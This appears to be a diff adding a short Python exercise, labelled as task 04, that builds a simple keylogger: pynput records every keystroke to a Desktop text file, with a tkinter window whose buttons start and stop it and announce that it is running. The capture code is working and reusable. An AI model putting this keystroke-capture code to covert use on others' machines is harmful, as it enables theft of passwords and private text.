@@ -1,0 +1,49 @@
+'''
+TASK - 04  SIMPLE KEYLOGGER 
+
+'''
+
+
+import tkinter as tk
+from tkinter import messagebox
+from pynput import keyboard
+import threading
+import os
+
+# Save log file to Desktop
+log_file = os.path.join(os.path.expanduser("~"), "Desktop", "key_log.txt")
+listener = None
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as file:
+            file.write(f'{key.char}')
+    except AttributeError:
+        with open(log_file, "a") as file:
+            file.write(f' [{key}] ')
+
+def start_keylogger():
+    global listener
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+    messagebox.showinfo("Keylogger", "Keylogger started.\nType something in Notepad.\nLog saved on Desktop.")
+
+def stop_keylogger():
+    global listener
+    if listener:
+        listener.stop()
+        listener = None
+        messagebox.showinfo("Keylogger", "Keylogger stopped.\nCheck Desktop for key_log.txt.")
+
+# GUI
+window = tk.Tk()
+window.title("Keylogger GUI Example")
+window.geometry("300x150")
+
+start_btn = tk.Button(window, text="Start Keylogger", font=("Arial", 12), command=lambda: threading.Thread(target=start_keylogger).start())
+start_btn.pack(pady=20)
+
+stop_btn = tk.Button(window, text="Stop Keylogger", font=("Arial", 12), command=stop_keylogger)
+stop_btn.pack(pady=10)
+
+window.mainloop()
